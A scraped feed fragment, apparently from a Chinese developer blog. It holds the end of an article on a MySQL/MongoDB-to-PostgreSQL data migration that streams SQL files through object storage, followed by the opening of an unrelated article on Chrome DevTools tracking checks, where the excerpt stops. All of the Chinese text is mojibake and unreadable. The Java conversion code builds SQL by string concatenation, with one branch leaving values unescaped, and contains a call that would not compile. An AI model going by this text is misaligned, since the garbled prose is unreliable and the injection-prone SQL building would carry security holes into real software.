<p><strong>æ ¸å¿ƒæŠ€å·§</strong>ï¼š</p>
<ul>
<li><code>stmt.setFetchSize(Integer.MIN_VALUE)</code>ï¼šMySQL JDBCçš„ç‰¹æ®Šçº¦å®šï¼Œå¯ç”¨æœåŠ¡å™¨ç«¯æ¸¸æ ‡</li>
<li>æ¯æ¬¡åªæ‹‰å–1è¡Œæ•°æ®åˆ°å®¢æˆ·ç«¯ï¼Œå†…å­˜å ç”¨æ’å®š</li>
<li>æ‰¹é‡æ‹¼æ¥VALUESï¼šå¤šè¡Œç”Ÿæˆä¸€æ¡INSERTï¼Œå‡å°‘SQLæ•°é‡</li>
</ul>
<h4 data-id="heading-30">MongoDBæµå¼è¯»å–</h4>
<pre><code class="hljs language-java" lang="java">CloseableIterator&lt;Document&gt; iterator = 
    mongoTemplate.stream(query, Document.class, collectionName);

<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">while</span> (iterator.hasNext()) {
        <span class="hljs-type">Document</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> iterator.next();  <span class="hljs-comment">// é€æ–‡æ¡£å¤„ç†</span>
        processDocument(doc);
    }
} <span class="hljs-keyword">finally</span> {
    iterator.close();  <span class="hljs-comment">// âš ï¸ å¿…é¡»æ‰‹åŠ¨å…³é—­ï¼Œå¦åˆ™è¿æ¥æ³„æ¼ï¼</span>
}
</code></pre>
<p><strong>å¡”å†…æ‰§è¡Œï¼šæµå¼è¯»å–</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(
         <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(ossStream))) {
    
    List&lt;String&gt; sqlBatch = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">currentSql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
    String line;
    
    <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// æ‹¼æ¥å½“å‰è¡Œ</span>
        currentSql.append(line);
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯å®Œæ•´çš„SQLï¼ˆä»¥;#END#ç»“å°¾ï¼‰</span>
        <span class="hljs-keyword">if</span> (currentSql.toString().endsWith(<span class="hljs-string">";#END#"</span>)) {
            <span class="hljs-comment">// è¿˜åŸï¼šç‰¹æ®Šç¬¦å· â†’ æ­£å¸¸åˆ†å·</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">realSql</span> <span class="hljs-operator">=</span> currentSql.toString().replace(<span class="hljs-string">";#END#"</span>, <span class="hljs-string">";"</span>);
            
            <span class="hljs-comment">// æ·»åŠ åˆ°æ‰¹æ¬¡</span>
            sqlBatch.add(realSql);
            currentSql.setLength(<span class="hljs-number">0</span>);  <span class="hljs-comment">// æ¸…ç©ºï¼Œå‡†å¤‡ä¸‹ä¸€æ¡SQL</span>
            
            <span class="hljs-comment">// æ‰¹é‡æ‰§è¡Œï¼ˆæ¯100æ¡ä¸€æ‰¹ï¼Œå¡”å¤–10æ¡æ•°æ®æ„é€ æˆ1ä¸ªinsertè¯­å¥ï¼‰</span>
            <span class="hljs-keyword">if</span> (sqlBatch.size() &gt;= <span class="hljs-number">100</span>) {
                executeBatch(stmt, sqlBatch);
                sqlBatch.clear();
            }
        }
    }
    
    <span class="hljs-comment">// æ‰§è¡Œå‰©ä½™SQL</span>
    <span class="hljs-keyword">if</span> (!sqlBatch.isEmpty()) {
        executeBatch(stmt, sqlBatch);
    }
    
    <span class="hljs-comment">// å…³é”®ï¼šè‡ªåŠ¨æäº¤ï¼Œé¿å…äº‹åŠ¡è¿‡å¤§</span>
    conn.setAutoCommit(<span class="hljs-literal">true</span>);
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆ<code>setAutoCommit(true)</code>ï¼Ÿ</strong></p>
<p>å•æ–‡ä»¶å¯èƒ½å‡ åƒæ¡SQLï¼Œå¦‚æœåœ¨ä¸€ä¸ªäº‹åŠ¡é‡Œä¼šå¯¼è‡´ï¼š</p>
<ul>
<li><strong>é”è¡¨æ—¶é—´è¿‡é•¿</strong></li>
<li><strong>å›æ»šæ—¥å¿—æš´æ¶¨</strong></li>
<li><strong>å†…å­˜å ç”¨é£™å‡</strong></li>
</ul>
<p>è‡ªåŠ¨æäº¤åï¼Œ<strong>æ¯æ¡SQLç‹¬ç«‹æäº¤</strong>ï¼Œé¿å…ä»¥ä¸Šé—®é¢˜ã€‚</p>
<p><strong>æ•ˆæœå¯¹æ¯”ï¼š</strong></p>




















<table><thead><tr><th>æ–¹æ¡ˆ</th><th>å†…å­˜å ç”¨</th><th>é£é™©</th></tr></thead><tbody><tr><td>ä¸€æ¬¡æ€§åŠ è½½</td><td><strong>2GB</strong>(50Wè¡Œ)</td><td><strong>å¿…ç„¶OOM</strong></td></tr><tr><td>æµå¼å¤„ç†</td><td><strong>50MB</strong>(å¸¸é‡çº§)</td><td><strong>ç¨³å®š</strong></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-31">ç¬¬äº”éš¾ï¼šMongoDBåˆ°PostgreSQLçš„ç±»å‹è½¬æ¢</h2>
<h3 data-id="heading-32">é—®é¢˜</h3>
<p>MongoDBå’ŒPostgreSQLçš„æ•°æ®ç±»å‹å®Œå…¨ä¸å…¼å®¹ï¼š</p>

























<table><thead><tr><th>MongoDB</th><th>PostgreSQL</th><th>é—®é¢˜</th></tr></thead><tbody><tr><td>ObjectId</td><td>æ— å¯¹åº”ç±»å‹</td><td>ä¸»é”®è½¬æ¢</td></tr><tr><td>BSONå¯¹è±¡</td><td>JSONB</td><td>åµŒå¥—ç»“æ„</td></tr><tr><td>æ•°ç»„</td><td>Array</td><td>ç±»å‹å£°æ˜</td></tr></tbody></table>
<h3 data-id="heading-33">è§£å†³æ–¹æ¡ˆ</h3>
<p>åœ¨é…ç½®è¡¨çš„æ‰©å±•å­—æ®µå®šä¹‰ç±»å‹æ˜ å°„ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mongoCollection"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"user_profile"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"pgTable"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"user_profile"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"fieldMapping"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"id"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"preferences"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"preferences"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"tags"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tags"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"typeMapping"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"OBJECTID_TO_VARCHAR"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"preferences"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"JSONB"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"tags"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"INTEGER_ARRAY"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ç±»å‹è½¬æ¢ä»£ç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> String <span class="hljs-title function_">convertValue</span><span class="hljs-params">(Object value, String typeRule)</span> {
    <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"NULL"</span>;
    
    <span class="hljs-keyword">switch</span> (typeRule) {
        <span class="hljs-keyword">case</span> <span class="hljs-string">"JSONB"</span>:
            <span class="hljs-comment">// {name: "test"} â†’ '{"name":"test"}'::jsonb</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> toJsonString(value);
            <span class="hljs-keyword">return</span> <span class="hljs-string">"'"</span> + escapeSql(json) + <span class="hljs-string">"'::jsonb"</span>;
            
        <span class="hljs-keyword">case</span> <span class="hljs-string">"INTEGER_ARRAY"</span>:
            <span class="hljs-comment">// [1,2,3] â†’ ARRAY[1,2,3]::INTEGER[]</span>
            List&lt;Integer&gt; list = (List) value;
            <span class="hljs-keyword">return</span> <span class="hljs-string">"ARRAY["</span> + String.join(<span class="hljs-string">","</span>, list) + <span class="hljs-string">"]::INTEGER[]"</span>;
            
        <span class="hljs-keyword">case</span> <span class="hljs-string">"OBJECTID_TO_VARCHAR"</span>:
            <span class="hljs-comment">// ObjectId("507f...") â†’ '507f...'</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">"'"</span> + value.toString() + <span class="hljs-string">"'"</span>;
            
        <span class="hljs-keyword">default</span>:
            <span class="hljs-keyword">return</span> convertDefault(value);
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-34">å¤ç›˜ï¼šä¸€ä¸ªæœˆå®Œæˆè¿ç§»çš„å…³é”®</h2>
<h3 data-id="heading-35">æ•´ä½“æ¶æ„ï¼šå¡”å¤–-å¡”å†…åŒé“¾è·¯</h3>
<pre><code class="hljs language-sql" lang="sql">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ å¡”å¤–ç³»ç»Ÿ (<span class="hljs-keyword">Outer</span>) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                                         â”‚
â”‚  â‘  APIè§¦å‘åŒæ­¥                          â”‚
â”‚  â‘¡ æŸ¥è¯¢é…ç½®è¡¨ â†’ æ‹†åˆ†å…¬å¸çº§<span class="hljs-operator">/</span>åº—é“ºçº§é…ç½®       â”‚
â”‚  â‘¢ æ„å»ºMQæ¶ˆæ¯ â†’ æŠ•é€’RocketMQ             â”‚
â”‚  â‘£ MQ Consumer                         â”‚
â”‚     â”œâ”€ <span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> è·å–è¡¨ç»“æ„       â”‚
â”‚     â”œâ”€ æµå¼è¯»å–æºæ•°æ®åº“                    â”‚
â”‚     â”œâ”€ ç”Ÿæˆ <span class="hljs-keyword">DELETE</span> <span class="hljs-operator">+</span> <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">SQL</span>          â”‚
â”‚     â”œâ”€ åˆ†å·æ›¿æ¢ä¸ºç‰¹æ®Šç¬¦å·                  â”‚
â”‚     â””â”€ ä¸Šä¼ åˆ° OSS                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â”‚
                    â”‚ OSSä¸­è½¬
                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ å¡”å†…ç³»ç»Ÿ (<span class="hljs-keyword">Inner</span>) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                                         â”‚
â”‚  â‘¤ å®šæ—¶ä»»åŠ¡ <span class="hljs-operator">/</span> æ‰‹åŠ¨è§¦å‘                    â”‚
â”‚  â‘¥ æ‰«æOSSç›®å½• â†’ è·å–å¾…å¤„ç†<span class="hljs-keyword">SQL</span>æ–‡ä»¶åˆ—è¡¨      â”‚
â”‚  â‘¦ æµå¼ä¸‹è½½<span class="hljs-keyword">SQL</span>æ–‡ä»¶ â†’ é€è¡Œè¯»å–              â”‚
â”‚     â”œâ”€ ç‰¹æ®Šç¬¦å·è¿˜åŸä¸ºåˆ†å·                  â”‚
â”‚     â”œâ”€ æ‰¹é‡æ‰§è¡Œ(<span class="hljs-number">1000</span>æ¡<span class="hljs-operator">/</span>æ‰¹)                â”‚
â”‚     â””â”€ setAutoCommit(<span class="hljs-literal">true</span>) é˜²æ­¢äº‹åŠ¡è¿‡å¤§   â”‚
â”‚  â‘§ æ‰§è¡ŒæˆåŠŸ â†’ ç«‹å³åˆ é™¤OSSæ–‡ä»¶              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-36">æ ¸å¿ƒäº®ç‚¹æ€»ç»“</h3>









































<table><thead><tr><th>æŠ€æœ¯ç‚¹</th><th>ä¼ ç»Ÿæ–¹æ¡ˆ</th><th>æœ¬æ–¹æ¡ˆ</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>è¡¨ç»“æ„è·å–</td><td>æ‰‹å†™100ä¸ªMapper</td><td><code>SHOW CREATE TABLE</code>åŠ¨æ€è§£æ</td><td>é›¶ç¡¬ç¼–ç ï¼Œæ”¯æŒä»»æ„è¡¨</td></tr><tr><td>SQLåˆ†éš”ç¬¦</td><td>ç”¨<code>;</code>åˆ¤æ–­ç»“æŸ</td><td>ç‰¹æ®Šç¬¦å·<code>;#END#</code></td><td>æ”¯æŒæ•°æ®å«åˆ†å·ã€æ¢è¡Œç¬¦</td></tr><tr><td>åŒæ­¥ç­–ç•¥</td><td>å…¨é‡åŒæ­¥orç¡¬ç¼–ç </td><td>é…ç½®è¡¨+å ä½ç¬¦</td><td>çµæ´»é…ç½®ï¼Œ4ç§ç­–ç•¥</td></tr><tr><td>å¤§æ•°æ®é‡å¤„ç†</td><td>ä¸€æ¬¡æ€§åŠ è½½(OOM)</td><td>æµå¼è¯»å–+ä¸´æ—¶æ–‡ä»¶</td><td>å¸¸é‡çº§å†…å­˜ï¼Œ50W+è¡Œç¨³å®š</td></tr><tr><td>æ‰©å±•æ€§</td><td>æ–°å¢è¡¨éœ€æ”¹ä»£ç </td><td>åªéœ€åŠ é…ç½®</td><td>ç§’çº§ä¸Šçº¿æ–°è¡¨åŒæ­¥</td></tr></tbody></table>
<h3 data-id="heading-37">åšå¯¹çš„3ä»¶äº‹</h3>
<p><strong>1. ä»å·¥å…·ä¸­å·å¸ˆå­¦è‰º</strong><br/>
Navicatçš„å¯¼å…¥/å¯¼å‡ºåŠŸèƒ½å¯å‘äº†æ•´ä½“æ–¹æ¡ˆï¼Œ<code>SHOW CREATE TABLE</code>æ˜¯çªç ´å£</p>
<p><strong>2. æŠŠå¤æ‚é€»è¾‘æ”¾åœ¨å¡”å¤–</strong><br/>
å¡”å†…åªè´Ÿè´£æ‰§è¡ŒSQLï¼Œé€»è¾‘ç®€å•ï¼›å¡”å¤–å¯ä»¥éšæ„è°ƒè¯•ã€ä¼˜åŒ–</p>
<p><strong>3. é…ç½®é©±åŠ¨ï¼Œè€Œéä»£ç é©±åŠ¨</strong><br/>
æ–°å¢è¡¨åªéœ€åŠ é…ç½®ï¼Œä¸æ”¹ä»£ç ã€‚åç»­ç»´æŠ¤æˆæœ¬è¶‹è¿‘äº0</p>
<h3 data-id="heading-38">æœ€ç»ˆæ•ˆæœ</h3>





































<table><thead><tr><th>æŒ‡æ ‡</th><th>æ•°æ®</th></tr></thead><tbody><tr><td>è¿ç§»è¡¨æ•°é‡</td><td>200+å¼ ï¼ˆå«åç»­æ–°å¢ï¼‰</td></tr><tr><td>æœ€å¤§å•è¡¨æ•°æ®</td><td>1000+ä¸‡è¡Œ</td></tr><tr><td>é¦–æ¬¡å…¨é‡åŒæ­¥</td><td>10-30åˆ†é’Ÿ</td></tr><tr><td>æ—¥å¸¸å¢é‡åŒæ­¥</td><td>å…¬å¸çº§è¡¨çº¦30ç§’ï¼Œåº—é“ºçº§è¡¨çº¦1åˆ†é’Ÿ</td></tr><tr><td>å†…å­˜å ç”¨</td><td>ç¨³å®šåœ¨200MBå·¦å³</td></tr><tr><td>OOMæ¬¡æ•°</td><td>0ï¼ˆè¿ç»­è¿è¡Œ3ä¸ªæœˆï¼‰</td></tr><tr><td>å·¥æœŸ</td><td>25å¤©ï¼ˆæå‰5å¤©å®Œæˆï¼‰</td></tr></tbody></table>
<hr/>
<hr/>
<h2 data-id="heading-39">å†™åœ¨æœ€å</h2>
<p>ä»¥ä¸Šä¾¿æ˜¯æˆ‘è¿™æ¬¡è¿ç§»å®æˆ˜çš„å…¨éƒ¨åˆ†äº«ã€‚ç»éæ ‡å‡†ç­”æ¡ˆï¼Œä½†å¸Œæœ›èƒ½ä¸ºä½ å¸¦æ¥ä¸€ä¸çµæ„Ÿã€‚</p>
<p>è¿™æ¬¡è¿ç§»è®©æˆ‘æ·±åˆ»ä½“ä¼šåˆ°ï¼š
<strong>å¥½çš„æ¶æ„ä¸æ˜¯è®¾è®¡å‡ºæ¥çš„ï¼Œè€Œæ˜¯ä»å®é™…é—®é¢˜ä¸­"å·"å‡ºæ¥çš„ã€‚</strong></p>
<p>å½“ä½ é¢å¯¹æŠ€æœ¯éš¾é¢˜æ—¶ï¼Œä¸å¦¨é—®è‡ªå·±ï¼š</p>
<ul>
<li>æœ‰æ²¡æœ‰ç°æˆçš„å·¥å…·å·²ç»è§£å†³äº†ç±»ä¼¼é—®é¢˜ï¼Ÿä¸è¦é‡å¤é€ è½®å­ï¼ï¼ï¼ˆNavicatï¼‰</li>
<li>æ•°æ®åº“/æ¡†æ¶æœ¬èº«æä¾›äº†ä»€ä¹ˆèƒ½åŠ›ï¼Ÿï¼ˆSHOW CREATE TABLEã€setFetchSizeï¼‰</li>
<li>èƒ½å¦ç”¨é…ç½®ä»£æ›¿ç¡¬ç¼–ç ï¼Ÿï¼ˆé…ç½®è¡¨+å ä½ç¬¦ï¼‰</li>
</ul>
<h3 data-id="heading-40">æ„Ÿè°¢é‚£äº›"é»˜é»˜æ‰›ä¸‹æ‰€æœ‰"çš„æŠ€æœ¯ç»†èŠ‚</h3>
<ul>
<li><strong><code>SHOW CREATE TABLE</code></strong> â€”â€” ä½ æ‰›ä¸‹äº†è¡¨ç»“æ„è§£æçš„è‹¦æ´»</li>
<li><strong><code>stmt.setFetchSize(Integer.MIN_VALUE)</code></strong> â€”â€” ä½ é»˜é»˜å®ˆæŠ¤äº†å†…å­˜å®‰å…¨</li>
<li><strong><code>;#END#</code></strong> â€”â€” ä½ å¯èƒ½æ˜¯å…¨ç½‘æœ€è¯¡å¼‚ä½†æœ€å®ç”¨çš„åˆ†éš”ç¬¦</li>
<li><strong>RocketMQçš„TAGè¿‡æ»¤</strong> â€”â€” ä½ è®©æ¶ˆæ¯è·¯ç”±å˜å¾—ä¼˜é›…</li>
<li><strong>CompletableFuture</strong> â€”â€” ä½ è®©å¡”å†…å¹¶å‘å¤„ç†æˆä¸ºå¯èƒ½</li>
<li><strong><code>System.lineSeparator()</code></strong> â€”â€” ä½ è®©SQLæ–‡ä»¶æ ¼å¼æ¸…æ™°æ˜äº†</li>
</ul>
<h3 data-id="heading-41">æœ€åé€å¤§å®¶ä¸€æ®µè¯</h3>
<p><strong>å†™ä»£ç çš„æ—¶å€™ï¼Œæˆ‘ä»¬éƒ½æ˜¯ç«™åœ¨å·¨äººè‚©è†€ä¸Šçš„è¿½æ¢¦äººã€‚</strong></p>
<p><strong>æŠ€æœ¯æœ¬èº«æ²¡æœ‰é«˜ä½è´µè´±ï¼Œèƒ½è§£å†³é—®é¢˜çš„å°±æ˜¯å¥½æŠ€æœ¯</strong>ã€‚ä¸è¦ç›²ç›®è¿½æ±‚æ‰€è°“çš„"æœ€ä½³å®è·µ"ï¼Œ<strong>åœ¨çº¦æŸä¸‹æ±‚æœ€ä¼˜è§£</strong>ï¼Œæ‰æ˜¯å·¥ç¨‹å¸ˆçš„æ™ºæ…§ã€‚</p>
<p><strong>æ„¿ä½ åœ¨æŠ€æœ¯çš„é“è·¯ä¸Šï¼Œæ—¢èƒ½ä»°æœ›æ˜Ÿç©ºï¼Œä¹Ÿèƒ½è„šè¸å®åœ°ã€‚</strong></p>
<hr/>
<blockquote>
<p>"åœ¨æŠ€æœ¯çš„ä¸–ç•Œé‡Œï¼Œæ²¡æœ‰å®Œç¾çš„æ–¹æ¡ˆï¼Œåªæœ‰æœ€åˆé€‚çš„é€‰æ‹©ã€‚<br/>
è€Œæœ€åˆé€‚çš„é€‰æ‹©ï¼Œå¾€å¾€æ¥è‡ªäºå¯¹é—®é¢˜æœ¬è´¨çš„æ·±åˆ»ç†è§£ã€‚"<br/>
â€”â€” ä¸€ä¸ªåœ¨ç”Ÿäº§ç¯å¢ƒçˆ¬å‘çš„åç«¯å¼€å‘</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»ç—›ç‚¹åˆ°æ¶æ„ï¼šç”¨ Chrome DevTools Panel åšåŸ‹ç‚¹æ ¡éªŒï¼Œæˆ‘æ˜¯æ€ä¹ˆè½åœ°çš„]]></title>    <link>https://juejin.cn/post/7597314244269228086</link>    <guid>https://juejin.cn/post/7597314244269228086</guid>    <pubDate>2026-01-21T02:39:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597314244269228086" data-draft-id="7597348011459641386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»ç—›ç‚¹åˆ°æ¶æ„ï¼šç”¨ Chrome DevTools Panel åšåŸ‹ç‚¹æ ¡éªŒï¼Œæˆ‘æ˜¯æ€ä¹ˆè½åœ°çš„"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Chrome"/> <meta itemprop="datePublished" content="2026-01-21T02:39:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è½¬è½¬æŠ€æœ¯å›¢é˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/606586148237431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»ç—›ç‚¹åˆ°æ¶æ„ï¼šç”¨ Chrome DevTools Panel åšåŸ‹ç‚¹æ ¡éªŒï¼Œæˆ‘æ˜¯æ€ä¹ˆè½åœ°çš„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/606586148237431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è½¬è½¬æŠ€æœ¯å›¢é˜Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T02:39:31.000Z" title="Wed Jan 21 2026 02:39:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»19åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">01 èƒŒæ™¯</h2>
<h3 data-id="heading-1">è¢«å¿½è§†çš„â€œéšå½¢æ—¶é—´æ€æ‰‹â€</h3>
